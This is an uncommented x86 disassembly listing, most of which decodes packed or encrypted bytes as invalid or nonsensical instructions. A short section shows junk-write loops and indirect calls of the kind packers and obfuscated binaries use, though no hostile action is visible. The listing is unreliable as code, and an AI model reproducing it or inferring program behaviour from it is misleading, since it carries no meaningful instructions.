  4138a3:	stos   BYTE PTR es:[edi],al
  4138a4:	out    0x20,eax
  4138a6:	mov    ds:0x1e77412d,al
  4138ab:	retf   
  4138ac:	push   0xbf2c62a4
  4138b1:	dec    edx
  4138b2:	or     BYTE PTR [edx+0x234c8c13],dl
  4138b8:	xchg   BYTE PTR [ecx+eax*2+0x23],al
  4138bc:	mov    ebp,0x40d99a1a
  4138c1:	adc    eax,0x1e250b19
  4138c6:	out    dx,al
  4138c7:	cmp    ebx,DWORD PTR [esi]
  4138c9:	mov    esp,DWORD PTR [eax+0x65]
  4138cc:	popf   
  4138cd:	xchg   esi,eax
  4138ce:	enter  0x1870,0x85
  4138d2:	or     DWORD PTR [ebp-0x52],esp
  4138d5:	out    0x98,al
  4138d7:	xor    ebx,DWORD PTR [eax+esi*4]
  4138da:	leave  
  4138db:	imul   ebp,DWORD PTR [edx+0x10],0x9e288101
  4138e2:	xor    eax,0xd67ca1be
  4138e7:	fistp  DWORD PTR [eax+0x3b]
  4138ea:	(bad)  
  4138eb:	ror    eax,0x5b
  4138ee:	test   bl,bl
  4138f0:	icebp  
  4138f1:	adc    al,0xea
  4138f3:	or     al,0x57
  4138f5:	cld    
  4138f6:	outs   dx,BYTE PTR ds:[esi]
  4138f7:	cmc    
  4138f8:	test   BYTE PTR [ebp+0x74],bl
  4138fb:	mov    ah,0xd0
  4138fd:	aas    
  4138fe:	xlat   BYTE PTR ds:[ebx]
  4138ff:	dec    ecx
  413900:	sub    al,0x4f
  413902:	jmp    0x6c13:0xa45a25d8
  413909:	xor    ebx,edi
  41390b:	mov    al,ds:0x892d77ae
  413910:	lods   eax,DWORD PTR ds:[esi]
  413911:	mov    al,0x8f
  413913:	sbb    ah,ch
  413915:	xor    al,0x1
  413917:	or     dh,ah
  413919:	dec    ebx
  41391a:	rcl    BYTE PTR [ebp-0x5c5f4de6],1
  413920:	and    cl,BYTE PTR [eax+0x31]
  413923:	add    BYTE PTR [esi],0x1c
  413926:	pop    ecx
  413927:	mov    esi,0x2ded58c6
  41392c:	mov    BYTE PTR [ebp-0x7c81229b],bh
  413932:	pop    es
  413933:	xchg   edi,eax
  413934:	in     eax,dx
  413935:	int3   
  413936:	in     eax,0x4a
  413938:	jbe    0x4138c7
  41393a:	(bad)  
  41393c:	sub    eax,0xae6bfe4f
  413941:	mov    WORD PTR [ecx*1-0x3a45af0a],cs
  413948:	dec    ecx
  413949:	xlat   BYTE PTR ds:[ebx]
  41394a:	add    ebp,DWORD PTR ds:0xbb93cb8f
  413950:	mov    al,ds:0x65abf5f7
  413955:	mov    al,ds:0xca9d9400
  41395a:	test   DWORD PTR [edi+0x3f982ded],0x8aabe04a
  413964:	mov    dl,dh
  413966:	push   ecx
  413967:	xchg   edx,eax
  413968:	into   
  413969:	(bad)  
  41396b:	stc    
  41396c:	push   esp
  41396d:	xor    bh,BYTE PTR [ecx+0x49f9482e]
  413973:	iret   
  413974:	enter  0xcacd,0x78
  413978:	fidiv  DWORD PTR [edx-0x13]
  41397b:	mov    esi,0x7c0a7e4b
  413980:	mov    eax,ds:0x8a77fc14
  413985:	(bad)  
  413986:	jp     0x413989
  413988:	cmp    BYTE PTR cs:[esi-0x7f576d90],dl
  41398f:	test   al,0x64
  413991:	mov    al,ds:0xda1a2413
  413996:	jae    0x413988
  413998:	loop   0x413a13
  41399a:	inc    esi
  41399b:	loop   0x41394d
  41399d:	les    edx,FWORD PTR [edi+ebx*1-0x42b0f5f1]
  4139a4:	mov    eax,0xd8c313c2
  4139a9:	call   0x5b17:0xc2fbcea9
  4139b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4139b1:	shl    BYTE PTR [esi+0x40],1
  4139b4:	dec    esi
  4139b5:	mov    dl,0x1e
  4139b7:	adc    eax,0x209876c5
  4139bc:	(bad)  
  4139bd:	(bad)  
  4139be:	ficomp DWORD PTR [esi-0x37b1ca9d]
  4139c4:	xor    BYTE PTR [esi-0x7a8a1bbe],ah
  4139ca:	mov    ebx,0x2b2c1235
  4139cf:	daa    
  4139d0:	adc    edi,eax
  4139d2:	mov    ebp,ds
  4139d4:	inc    esi
  4139d5:	out    0x38,eax
  4139d7:	jl     0x4139ab
  4139d9:	fsubr  QWORD PTR ds:0xa39e4f98
  4139df:	xor    eax,0x3959e431
  4139e4:	outs   dx,BYTE PTR fs:[esi]
  4139e6:	mov    esi,0x951724a3
  4139eb:	sub    eax,0x3934c3d5
  4139f0:	dec    ebp
  4139f1:	add    eax,DWORD PTR [eax]
  4139f3:	jo     0x4139cb
  4139f5:	sar    ch,0x40
  4139f8:	adc    eax,0xcb3d095c
  4139fd:	inc    eax
  4139fe:	mov    al,ds:0xa72fbfb1
  413a03:	pop    ecx
  413a04:	loop   0x4139e9
  413a06:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413a07:	loopne 0x413997
  413a09:	div    esp
  413a0b:	mov    esp,esi
  413a0d:	test   eax,0x45609eb6
  413a12:	out    0x62,eax
  413a14:	mov    edi,0xe6bd693b
  413a19:	push   ebx
  413a1a:	jno    0x413a4f
  413a1c:	cmp    dl,BYTE PTR ds:0xcbe35687
  413a22:	push   edi
  413a23:	adc    al,0x4b
  413a25:	xchg   DWORD PTR [edx],esp
  413a27:	or     BYTE PTR [eax-0x2c7078e0],ah
  413a2d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413a2e:	ud1    eax,DWORD PTR [ecx+0x577b205e]
  413a35:	pop    ecx
  413a36:	or     ch,bl
  413a38:	in     al,dx
  413a39:	sbb    ah,BYTE PTR [ecx+0x49]
  413a3c:	loop   0x413a58
  413a3e:	xor    BYTE PTR [edi+esi*4],ah
  413a41:	out    dx,eax
  413a42:	pop    eax
  413a43:	cmp    dh,BYTE PTR [ebp+edx*8-0x34]
  413a47:	fsubr  st,st(5)
  413a49:	push   esi
  413a4a:	aam    0x4d
  413a4c:	divps  xmm3,XMMWORD PTR [edx]
  413a4f:	pop    ebx
  413a50:	or     eax,0xffbd77e8
  413a55:	(bad)  
  413a56:	jmp    0x413d3a
  413a5b:	pop    ebx
  413a5c:	ins    DWORD PTR es:[edi],dx
  413a5d:	and    al,0xa9
  413a5f:	xor    dh,BYTE PTR [ecx+0x71]
  413a62:	ins    DWORD PTR es:[edi],dx
  413a63:	jp     0x413a20
  413a65:	or     esi,ecx
  413a67:	and    DWORD PTR [ecx-0x66],edx
  413a6a:	les    edi,FWORD PTR [esi+0x68]
  413a6d:	jo     0x413adf
  413a6f:	mov    ecx,0xb470707e
  413a74:	outs   dx,BYTE PTR ds:[esi]
  413a75:	mov    esi,0x8d1b794a
  413a7a:	nop
  413a7b:	cli    
  413a7c:	std    
  413a7d:	pop    ds
  413a7e:	jg     0x413adb
  413a80:	js     0x413a41
  413a82:	add    bl,ah
  413a84:	cmp    eax,0x57ad3b74
  413a89:	sbb    BYTE PTR [edx+0x44607dfa],ah
  413a8f:	jge    0x413adf
  413a91:	retf   
  413a92:	int3   
  413a93:	ret    0x7ee4
  413a96:	mov    esp,0x6587ab8e
  413a9b:	loopne 0x413a4b
  413a9d:	inc    ebx
  413a9e:	dec    ebx
  413a9f:	rcr    BYTE PTR [edi+0x78f58c41],cl
  413aa5:	mov    eax,ebp
  413aa7:	imul   esi,DWORD PTR [ecx+0x15],0xffffffee
  413aab:	into   
  413aac:	xor    bh,BYTE PTR [esi+0x4]
  413aaf:	cmp    BYTE PTR [ebx+ebp*8-0x45],cl
  413ab3:	mov    dh,0xfc
  413ab5:	cld    
  413ab6:	lods   al,BYTE PTR ds:[esi]
  413ab7:	cmp    dl,cl
  413ab9:	lods   al,BYTE PTR ds:[esi]
  413aba:	adc    BYTE PTR [edx+0x57],0x4e
  413abe:	stos   DWORD PTR es:[edi],eax
  413abf:	mov    ecx,DWORD PTR [edi]
  413ac1:	gs cdq 
  413ac3:	cmp    BYTE PTR [esi],bh
  413ac5:	jmp    0x413aa6
  413ac7:	pop    ebx
  413ac8:	nop
  413ac9:	mov    ds:0x6b4ba580,eax
  413ace:	push   ecx
  413acf:	std    
  413ad0:	xchg   ebx,eax
  413ad1:	cmp    al,0x52
  413ad3:	lods   eax,DWORD PTR ds:[esi]
  413ad4:	pop    esp
  413ad5:	xchg   BYTE PTR [ebx+0x17],ch
  413ad8:	ds pop ss
  413ada:	loopne 0x413b0e
  413adc:	push   ss
  413add:	or     ebx,DWORD PTR gs:[ebx+0x57]
  413ae1:	jmp    0x9dc1e00b
  413ae6:	loopne 0x413af7
  413ae8:	cmp    ebx,edx
  413aea:	mov    ah,bh
  413aec:	sbb    ebp,ebp
  413aee:	aas    
  413aef:	ror    BYTE PTR [ebx+0x2e],0x21
  413af3:	mov    esp,0x14b47e53
  413af8:	cwde   
  413af9:	lods   eax,DWORD PTR ds:[esi]
  413afa:	ficomp WORD PTR [ebx-0x602f98d7]
  413b00:	call   0x796d5ebc
  413b05:	repz push eax
  413b07:	jns    0x413abe
  413b09:	(bad)  
  413b0a:	mov    bl,0x22
  413b0c:	inc    edi
  413b0d:	cli    
  413b0e:	adc    al,BYTE PTR [ecx-0x79]
  413b11:	xchg   esp,eax
  413b12:	mov    esp,0xb6001959
  413b17:	shl    DWORD PTR [edx+0x23],0xa8
  413b1b:	pusha  
  413b1c:	das    
  413b1d:	sub    bh,BYTE PTR [esi]
  413b1f:	pop    ds
  413b20:	sahf   
  413b21:	aas    
  413b22:	aas    
  413b23:	push   ebx
  413b24:	pop    edi
  413b25:	push   cs
  413b26:	xchg   esi,eax
  413b27:	sbb    ebx,DWORD PTR [esi+eiz*2]
  413b2a:	repz cwde 
  413b2c:	sub    DWORD PTR [ebx],esp
  413b2e:	xchg   ebx,eax
  413b2f:	ret    0x8462
  413b32:	cld    
  413b33:	adc    al,0xaa
  413b35:	out    dx,eax
  413b36:	jp     0x413b65
  413b38:	mov    ds:0xe9a4104a,eax
  413b3d:	jmp    ebp
  413b3f:	cmp    eax,0x779e91ec
  413b44:	adc    eax,0xf9e310f6
  413b49:	dec    ecx
  413b4a:	jp     0x413acf
  413b4c:	(bad)  [esi+ebp*4+0x58211152]
  413b53:	inc    ecx
  413b54:	xchg   ecx,eax
  413b55:	mov    dh,0xd0
  413b57:	add    eax,0xeebe2c36
  413b5c:	jg     0x413b98
  413b5e:	jecxz  0x413bd2
  413b60:	add    ebp,0x2d
  413b63:	mov    ds:0x273ed0e1,eax
  413b68:	fsub   QWORD PTR [ebx-0x78]
  413b6b:	loope  0x413bc1
  413b6d:	push   eax
  413b6e:	addr16 jno 0x413bcd
  413b71:	inc    ebp
  413b72:	and    BYTE PTR [bp-0x3e],cl
  413b76:	mov    ds:0x3a180663,al
  413b7b:	cmp    dl,BYTE PTR [eax-0x3c]
  413b7e:	rcl    DWORD PTR [esi-0xbc9ff3],cl
  413b84:	dec    ebp
  413b85:	or     eax,esp
  413b87:	fidiv  WORD PTR ds:0x575d6489
  413b8d:	shl    BYTE PTR [eax-0x2895cc48],0xc3
  413b94:	sbb    ebx,0xffffff98
  413b97:	out    0x36,eax
  413b99:	adc    eax,0x56c2415f
  413b9e:	sar    DWORD PTR [ecx-0x59],cl
  413ba1:	cmp    ecx,0xd
  413ba4:	sbb    DWORD PTR [esi+0x4585eaa5],ecx
  413baa:	popa   
  413bab:	or     al,0xc4
  413bad:	sahf   
  413bae:	cmc    
  413baf:	test   al,0xc0
  413bb1:	cmc    
  413bb2:	icebp  
  413bb3:	push   ds
  413bb4:	test   eax,0xbffd311f
  413bb9:	dec    esp
  413bba:	fcomp  QWORD PTR [ebx+ecx*8]
  413bbd:	push   ecx
  413bbe:	inc    ebp
  413bbf:	add    BYTE PTR [eax+0x6],dl
  413bc2:	sub    eax,0x48172b1e
  413bc8:	jmp    0x413b7d
  413bca:	sbb    eax,0xc003df9a
  413bcf:	sub    al,ah
  413bd1:	fcom   QWORD PTR [edx-0x78]
  413bd4:	mov    edx,0xa598ea3c
  413bd9:	add    DWORD PTR [ecx-0x48f2fc8a],edx
  413bdf:	int    0x5a
  413be1:	popa   
  413be2:	fucomp st(2)
  413be4:	icebp  
  413be5:	mul    DWORD PTR ds:0xaff7317d
  413beb:	mov    dh,0x6d
  413bed:	pop    ecx
  413bee:	in     al,dx
  413bef:	cli    
  413bf0:	(bad)  
  413bf1:	frstor [edx]
  413bf3:	ins    DWORD PTR es:[edi],dx
  413bf4:	fld    TBYTE PTR [ebx]
  413bf6:	ret    0x7743
  413bf9:	push   ss
  413bfa:	push   ss
  413bfb:	stos   DWORD PTR es:[edi],eax
  413bfc:	lock or eax,0xf44ecc55
  413c02:	or     dh,bl
  413c04:	lahf   
  413c05:	(bad)  
  413c06:	sahf   
  413c07:	cmp    BYTE PTR [edx],ch
  413c09:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413c0a:	clc    
  413c0b:	je     0x413c0a
  413c0d:	pop    ds
  413c0e:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  413c10:	pop    edi
  413c11:	cmp    eax,0x64de268f
  413c16:	fidiv  WORD PTR [esi]
  413c18:	push   ds
  413c19:	shr    BYTE PTR [esi+0x6cf52e80],cl
  413c1f:	fwait
  413c20:	inc    esi
  413c21:	in     al,0x68
  413c23:	and    DWORD PTR [edx],ebx
  413c25:	mov    ah,bh
  413c27:	pop    eax
  413c28:	mov    ch,0xf8
  413c2a:	inc    esi
  413c2b:	out    0x33,al
  413c2d:	xor    eax,0x8d30867e
  413c32:	jno    0x413be6
  413c34:	cmp    al,0x99
  413c36:	jmp    DWORD PTR [ebp-0x52]
  413c39:	lds    edi,FWORD PTR [eax+eax*4-0x34b6380c]
  413c40:	hlt    
  413c41:	or     DWORD PTR [esi-0x6a1ce8d5],ecx
  413c47:	(bad)
  413c4b:	icebp  
  413c4c:	in     al,0x4e
  413c4e:	cmp    BYTE PTR [eax+0x55],bh
  413c51:	mov    ebx,0xb083407b
  413c56:	inc    ebx
  413c57:	call   0x6020:0x39a0c9a1
  413c5e:	pushf  
  413c5f:	enter  0x4bdf,0xcf
  413c63:	(bad)  
  413c64:	mov    edx,DWORD PTR [eax]
  413c66:	push   esp
  413c67:	jp     0x413bed
  413c69:	in     eax,0x3b
  413c6b:	mov    ebp,0x1505e37c
  413c70:	(bad)  [edi]
  413c72:	fs pop ecx
  413c74:	adc    bh,cl
  413c76:	adc    eax,DWORD PTR [esi]
  413c78:	imul   ecx,esp,0x83b5dd54
  413c7e:	adc    al,0x41
  413c80:	cli    
  413c81:	scas   al,BYTE PTR es:[edi]
  413c82:	mov    eax,ds:0x4921b92a
  413c87:	gs ja  0x413c10
  413c8a:	(bad)  
  413c8b:	xchg   esi,eax
  413c8c:	js     0x413c3c
  413c8e:	into   
  413c8f:	dec    ecx
  413c90:	pusha  
  413c91:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413c92:	pusha  
  413c93:	jle    0x413c86
  413c95:	(bad)  
  413c96:	mov    cl,0xd1
  413c98:	jmp    0x10a5:0x7285cc9
  413c9f:	test   ecx,0x2ab70afd
  413ca5:	xchg   esp,eax
  413ca6:	and    al,0x5
  413ca8:	jmp    0x9f79:0xe7c946ee
  413caf:	test   al,0x40
  413cb1:	in     eax,dx
  413cb2:	sub    DWORD PTR [ebp-0x25ab8c85],ebx
  413cb8:	xor    eax,0xff07d7f4
  413cbd:	push   ecx
  413cbe:	(bad)  
  413cbf:	adc    esp,DWORD PTR [edx+esi*4]
  413cc2:	hlt    
  413cc3:	(bad)  [ebp-0x7652a23e]
  413cc9:	mov    cl,0x60
  413ccb:	pop    ss
  413ccc:	enter  0x6b27,0x55
  413cd0:	ror    BYTE PTR [eax+ebp*2],cl
  413cd3:	lods   al,BYTE PTR ds:[esi]
  413cd4:	sub    al,BYTE PTR [esi]
  413cd6:	inc    esi
  413cd7:	int3   
  413cd8:	repz cmc 
  413cda:	and    BYTE PTR [eax],ch
  413cdc:	mov    cs,WORD PTR [esi]
  413cde:	sub    DWORD PTR [edi],0x2d55c03d
  413ce4:	popf   
  413ce5:	jne    0x413c90
  413ce7:	mov    edx,0x499b519a
  413cec:	dec    ecx
  413ced:	inc    edx
  413cee:	hlt    
  413cef:	fbld   TBYTE PTR [esi-0x4abbebd6]
  413cf5:	inc    ecx
  413cf6:	inc    ecx
  413cf7:	out    0x50,eax
  413cf9:	retf   
  413cfa:	loopne 0x413cc9
  413cfc:	test   BYTE PTR [edi+0x6c],ch
  413cff:	and    eax,edx
  413d01:	stos   DWORD PTR es:[edi],eax
  413d02:	xor    eax,DWORD PTR [ebp+0x1c]
  413d05:	popa   
  413d06:	pusha  
  413d07:	xlat   BYTE PTR ds:[ebx]
  413d08:	outs   dx,BYTE PTR ds:[esi]
  413d09:	clc    
  413d0a:	pop    es
  413d0b:	call   0xc6fc3b05
  413d10:	stos   BYTE PTR es:[edi],al
  413d11:	ret    
  413d12:	mov    ch,0x18
  413d14:	xor    esp,DWORD PTR [ebp-0x27]
  413d17:	test   al,0xdc
  413d19:	ins    DWORD PTR es:[edi],dx
  413d1a:	mov    al,0xd6
  413d1c:	or     DWORD PTR [edx-0x2916065c],eax
  413d22:	mov    ch,0xdd
  413d24:	mov    edi,0xdf1e98c7
  413d29:	test   al,0x51
  413d2b:	mov    ds:0x767da8e8,al
  413d30:	and    ebx,eax
  413d32:	mov    cl,BYTE PTR [edi+0x57]
  413d35:	xor    eax,0xde2850e7
  413d3a:	mov    DWORD PTR [ebp-0x20],eax
  413d3d:	mov    eax,DWORD PTR [ebp-0x4]
  413d40:	sub    ecx,ecx
  413d42:	mov    ecx,DWORD PTR [ebp-0x20]
  413d45:	mov    DWORD PTR ds:0x42e6ff,0x1b
  413d4f:	cmp    DWORD PTR ds:0x42e6ff,0x0
  413d56:	je     0x413dab
  413d5c:	cmp    DWORD PTR ds:0x42e6ff,0x2
  413d63:	jne    0x413d7f
  413d69:	push   DWORD PTR [ebp-0xc]
  413d6c:	push   0x52a1
  413d71:	push   0x824e
  413d76:	push   DWORD PTR [ebp-0x18]
  413d79:	call   DWORD PTR ds:0x42e56b
  413d7f:	cmp    DWORD PTR ds:0x42e6ff,0x3
  413d86:	jne    0x413d99
  413d8c:	mov    esi,DWORD PTR ds:0x42e6ff
  413d92:	dec    esi
  413d93:	mov    DWORD PTR ds:0x42e6ff,esi
  413d99:	mov    esi,DWORD PTR ds:0x42e6ff
  413d9f:	dec    esi
  413da0:	mov    DWORD PTR ds:0x42e6ff,esi
  413da6:	jmp    0x413d4f
  413dab:	mov    esi,0x7510855
  413db0:	or     DWORD PTR ds:0x42e70f,0x42fd86
  413dba:	xor    eax,esi
  413dbc:	add    eax,ebx
  413dbe:	cmp    ecx,eax
  413dc0:	mov    DWORD PTR ds:0x42e12c,0x588b
  413dca:	je     0x414b4e
  413dd0:	push   DWORD PTR [ebp-0x20]
  413dd3:	dec    DWORD PTR ds:0x42e6f7
  413dd9:	push   DWORD PTR [ebp+0x8]
  413ddc:	xor    DWORD PTR ds:0x42fcd9,0x42e120
  413de6:	call   0x405485
  413deb:	mov    DWORD PTR [ebp-0x14],eax
  413dee:	and    DWORD PTR ds:0x42e6fb,0x0
  413df8:	jmp    0x413e08
  413dfd:	mov    eax,ds:0x42e6fb
  413e02:	inc    eax
  413e03:	mov    ds:0x42e6fb,eax
  413e08:	cmp    DWORD PTR ds:0x42e6fb,0x10
  413e0f:	jae    0x413e33
  413e15:	cmp    DWORD PTR ds:0x42e6fb,0x16
  413e1c:	jne    0x413e28
  413e22:	call   DWORD PTR ds:0x42e48b
  413e28:	jmp    0x413dfd
  413e2d:	sub    DWORD PTR ds:0x42fd01,ecx
  413e33:	mov    eax,DWORD PTR [ebp-0x4]
  413e36:	or     DWORD PTR ds:0x42e6f7,edx
  413e3c:	mov    ecx,DWORD PTR [ebp-0x14]
  413e3f:	adc    DWORD PTR ds:0x42fd8a,0x2715
  413e49:	xor    eax,esi
  413e4b:	dec    DWORD PTR ds:0x42e703
  413e51:	add    eax,ebx
  413e53:	mov    DWORD PTR ds:0x42e11c,0x499a
  413e5d:	cmp    ecx,eax
  413e5f:	je     0x414b4e
  413e65:	not    eax
  413e67:	mov    eax,DWORD PTR [ebp-0x14]
  413e6a:	mov    eax,DWORD PTR [eax+0x18]
  413e6d:	mov    DWORD PTR [ebp-0x20],eax
  413e70:	xor    DWORD PTR ds:0x42e6fb,0x4f5
  413e7a:	jmp    0x41415e
  413e7f:	lods   al,BYTE PTR ds:[esi]
  413e80:	mov    WORD PTR [edx],gs
  413e82:	loopne 0x413eae
  413e84:	outs   dx,BYTE PTR ds:[esi]
  413e85:	push   0x4c
  413e87:	repz push edi
  413e89:	scas   eax,DWORD PTR es:[edi]
  413e8a:	(bad)  
  413e8b:	fwait
  413e8c:	mov    edi,0x7647a2f7
  413e91:	jo     0x413f03
  413e93:	mov    ecx,0x1570707e
  413e98:	(bad)  
  413e99:	popa   
  413e9a:	ret    0x46a
  413e9d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413e9e:	mov    dl,0x52
  413ea0:	cmp    eax,edx
  413ea2:	xchg   ecx,eax
  413ea3:	bound  ecx,QWORD PTR [esi+0x852277f]
  413ea9:	sbb    BYTE PTR [ebp+0x6d2ec827],bl
  413eaf:	adc    dh,BYTE PTR [ebx+0x36f81709]
  413eb5:	shl    BYTE PTR [ebp-0x3bcb22f2],cl
  413ebb:	js     0x413e4d
  413ebd:	dec    edx
  413ebe:	aas    
  413ebf:	cmp    eax,0x60
  413ec2:	jbe    0x413e86
  413ec4:	repnz out dx,eax
  413ec6:	out    dx,al
  413ec7:	pop    ebp
  413ec8:	cmp    BYTE PTR [edi+0x20],0x67
  413ecc:	mov    edi,0x95183ee3
  413ed1:	call   0xec0e:0x657c9a2a
  413ed8:	mov    al,0x76
  413eda:	sbb    esi,0x1189f8f2
  413ee0:	test   BYTE PTR [ecx],dl
  413ee2:	push   esi
  413ee3:	mov    bh,0xc8
  413ee5:	and    ebp,DWORD PTR [edi-0x7c]
  413ee8:	xchg   esp,eax
  413ee9:	jb     0x413e8e
  413eeb:	xlat   BYTE PTR ds:[ebx]
  413eec:	xlat   BYTE PTR fs:[ebx]
  413eee:	rol    DWORD PTR [edx-0x1759744e],0xec
  413ef5:	ror    BYTE PTR [edi+ebp*8],cl
  413ef8:	(bad)  
  413ef9:	sti    
  413efa:	ins    DWORD PTR es:[edi],dx
  413efb:	lods   al,BYTE PTR ds:[esi]
  413efc:	jp     0x413f0c
  413efe:	xor    al,0xdb
  413f00:	hlt    
  413f01:	outs   dx,DWORD PTR ds:[esi]
  413f02:	dec    BYTE PTR [esi+esi*2-0x4502f029]
  413f09:	shl    BYTE PTR [eax],1
  413f0b:	jmp    0xf1b0:0x5bb6d65b
  413f12:	or     edx,DWORD PTR [eax+0x5f7e384f]
  413f18:	sti    
  413f19:	and    dl,BYTE PTR [edi+0x33]
  413f1c:	xchg   ebx,eax
  413f1d:	pop    ss
  413f1e:	mov    eax,0x57ec0e34
  413f23:	and    al,0xc6
  413f25:	(bad)  
  413f26:	pop    edx
  413f27:	(bad)  
  413f29:	ds loopne 0x413f2f
  413f2c:	test   BYTE PTR [ebp+0x75d44cda],ah
  413f32:	repnz dec ebp
  413f34:	shl    BYTE PTR [edx-0x333498eb],0x44
  413f3b:	nop
  413f3c:	or     eax,0x4e441a9
  413f41:	xchg   ecx,eax
  413f42:	jmp    0x29d09a63
  413f47:	xchg   DWORD PTR [ebx],ebx
  413f49:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413f4a:	mov    ds:0xacc53ba4,al
  413f4f:	sub    cl,dl
  413f51:	ins    BYTE PTR es:[edi],dx
  413f52:	push   esi
  413f53:	mov    WORD PTR [esi+0x3ed50f4d],cs
  413f59:	jmp    0x413fb4
  413f5b:	shl    BYTE PTR [edi+0x34],0x63
  413f5f:	(bad)  
  413f60:	xlat   BYTE PTR ds:[ebx]
  413f61:	lock mov edx,0xffbf2aef
  413f67:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413f68:	sub    edx,esp
  413f6a:	out    0xf5,eax
  413f6c:	xchg   ebp,eax
  413f6d:	cld    
  413f6e:	adc    eax,DWORD PTR [ebx+0x2a]
  413f71:	mov    eax,0xae17e735
  413f76:	das    
  413f77:	add    edi,DWORD PTR [eax+0x4303503e]
  413f7d:	or     DWORD PTR [edx-0x5d],esp
  413f80:	jne    0x413fd5
  413f82:	xchg   ecx,eax
  413f83:	jmp    FWORD PTR [esi-0x4d]
  413f86:	(bad)  
  413f87:	retf   0xb61e
  413f8a:	adc    al,0xe3
  413f8c:	aad    0x3d
  413f8e:	cmp    al,dh
  413f90:	shl    DWORD PTR [eax],cl
  413f92:	in     eax,0x7f
  413f94:	inc    edx
  413f95:	add    DWORD PTR [edx-0x24],ebx
  413f98:	dec    edi
  413f99:	lea    ebp,[eax+0x72]
  413f9c:	scas   al,BYTE PTR es:[edi]
  413f9d:	or     eax,0x394a6294
  413fa2:	stos   BYTE PTR es:[edi],al
  413fa3:	push   es
  413fa4:	scas   eax,DWORD PTR es:[edi]
  413fa5:	mov    esi,0xa695afa0
  413faa:	dec    esi
  413fab:	cmp    ah,cl
  413fad:	cli    
  413fae:	cs ret 0x116a
  413fb2:	mov    esp,0x146174ac
  413fb7:	test   al,0xeb
  413fb9:	mov    ds:0xe2e284b0,eax
  413fbe:	int    0xfe
  413fc0:	pushf  
  413fc1:	int3   
  413fc2:	push   edi
  413fc3:	push   ebp
  413fc4:	jae    0x414033
  413fc6:	push   es
  413fc7:	cli    
  413fc8:	adc    eax,0x148fceb7
  413fcd:	push   edi
  413fce:	das    
  413fcf:	sahf   
  413fd0:	ins    BYTE PTR es:[edi],dx
  413fd1:	xchg   ebx,eax
  413fd2:	mov    BYTE PTR [edx-0x703f9359],ah
  413fd8:	jg     0x413ff2
  413fda:	int    0x5e
  413fdc:	and    ecx,DWORD PTR [ecx]
  413fde:	cmp    eax,0x4b7779b7
  413fe3:	and    BYTE PTR [edx+0x5a],dl
  413fe6:	es sub bh,dh
  413fe9:	test   DWORD PTR [esi-0x76],eax
  413fec:	in     eax,0xf4
  413fee:	ror    esi,0x27
  413ff1:	mov    ds:0x7b825463,al
  413ff6:	and    BYTE PTR [eax-0x6d986d58],ch
  413ffc:	or     ebp,ebp
  413ffe:	(bad)
  414001:	cdq    
  414002:	jns    0x41404c
  414004:	aaa    
  414005:	lods   eax,DWORD PTR ds:[esi]
  414006:	xchg   ebp,eax
  414007:	push   edi
  414008:	sbb    edx,DWORD PTR ds:0xb977e0e3
  41400e:	clc    
  41400f:	call   0xaf66:0x42b6a4de
  414016:	jp     0x413ffc
  414018:	and    esp,DWORD PTR [ebx]
  41401a:	idiv   esp
  41401c:	pusha  
  41401d:	xchg   ebx,eax
  41401e:	mov    dh,0x6e
  414020:	cmp    dl,BYTE PTR [edx+ebp*1]
  414023:	mov    dl,0xa2
  414025:	data16 fs aas 
  414028:	or     DWORD PTR [eax-0x4f],ebp
  41402b:	test   DWORD PTR [edx+edi*2-0x69],ecx
  41402f:	pop    ss
  414030:	adc    ebp,DWORD PTR [ebx-0x35]
  414033:	(bad)  
  414035:	in     eax,0xd9
  414037:	inc    esp
  414038:	add    ebx,DWORD PTR [edi-0x7e2292bb]
  41403e:	mov    ds:0x3a44971f,eax
  414043:	add    cl,bl
  414045:	cld    
  414046:	stos   BYTE PTR es:[edi],al
  414047:	cmp    ebp,edx
  414049:	fimul  DWORD PTR [esi]
  41404b:	push   esi
  41404c:	(bad)  
  41404e:	push   cs
  41404f:	loop   0x4140be
  414051:	popf   
  414052:	test   al,0xf5
  414054:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414055:	jne    0x413feb
  414057:	adc    al,0x52
  414059:	jns    0x413ffa
  41405b:	dec    edx
  41405c:	xchg   edi,eax
  41405d:	or     eax,0x18a6eb10
  414062:	or     eax,0x6d59238
  414067:	sti    
  414068:	mov    DWORD PTR [ebx],esi
  41406a:	lds    esp,FWORD PTR [ecx+0x7b]
  41406d:	sbb    BYTE PTR [edx+edi*8],0x41
  414071:	add    al,0xa5
  414073:	mov    ebp,?
  414075:	rcl    bl,cl
  414077:	ret    
  414078:	sub    esi,esi
  41407a:	sti    
  41407b:	enter  0x6854,0x8b
  41407f:	xor    BYTE PTR [esi+0x3ff128af],bl
  414085:	xor    DWORD PTR ds:0x520d9798,esi
  41408b:	and    eax,0xb17e4355
  414090:	mov    ah,0x3
  414092:	out    0x2f,al
  414094:	ret    0x881
  414097:	jbe    0x4140e9
  414099:	jae    0x4140c6
  41409b:	mul    DWORD PTR [edx+0x65a37f0e]
  4140a1:	push   esp
  4140a2:	sbb    bl,BYTE PTR [ecx]
  4140a4:	inc    edx
  4140a5:	xor    ah,BYTE PTR [ebx-0x50]
  4140a8:	mov    cl,BYTE PTR [edx]
  4140aa:	and    al,0xa6
  4140ac:	pop    edx
  4140ad:	sbb    ch,BYTE PTR [edx]
  4140af:	sbb    eax,0xf93ba075
  4140b4:	div    DWORD PTR [esp+edx*4+0x6d]
  4140b8:	lahf   
  4140b9:	adc    eax,0x8f3b6482
  4140be:	and    BYTE PTR [ecx-0x16],0xb0
  4140c2:	mov    esp,0x1e6cb128
  4140c7:	cdq    
  4140c8:	sbb    edx,DWORD PTR [edx-0x32ed1d9f]
  4140ce:	mov    edi,0xd2aedc7a
  4140d3:	push   es
  4140d4:	arpl   WORD PTR [eax],si
  4140d6:	pop    esi
  4140d7:	mov    dh,0x4a
  4140d9:	loop   0x41411f
  4140db:	jmp    0xb58f:0x9e57ceba
  4140e2:	mov    DWORD PTR [esi],ebp
  4140e4:	lahf   
  4140e5:	jmp    0xa8e6:0x621844cb
  4140ec:	ins    DWORD PTR es:[edi],dx
